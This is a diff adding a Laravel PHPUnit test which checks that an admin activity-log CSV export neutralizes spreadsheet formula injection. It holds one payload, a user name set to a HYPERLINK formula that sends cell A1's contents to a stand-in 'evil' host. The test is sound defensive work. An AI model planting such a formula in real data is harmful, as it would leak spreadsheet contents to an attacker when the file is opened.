@@ -218,6 +218,30 @@ class ActivityLogControllerTest extends TestCase
         );
     }
 
+    public function test_csv_export_neutralizes_formula_in_user_name(): void
+    {
+        $attacker = User::factory()->create(['name' => '=HYPERLINK("https://evil/?c="&A1, "x")']);
+
+        AuditLog::create([
+            'user_id'     => $attacker->id,
+            'entity_type' => 'App\\Models\\User',
+            'entity_id'   => $attacker->id,
+            'action'      => 'login',
+            'after_state' => ['x' => 1],
+            'ip_address'  => '10.0.0.1',
+        ]);
+
+        $response = $this->actingAs($this->admin)->get(route('admin.logs.activity.export'));
+
+        $response->assertOk();
+        $csv = $response->getContent();
+
+        // The dangerous payload must NOT appear at the start of a cell.
+        // After our fix it should be prefixed with a single quote.
+        $this->assertStringNotContainsString(",=HYPERLINK", $csv);
+        $this->assertStringContainsString("'=HYPERLINK", $csv); // neutralized form
+    }
+
     public function test_index_handles_login_failed_with_null_user(): void
     {
         AuditLog::create([
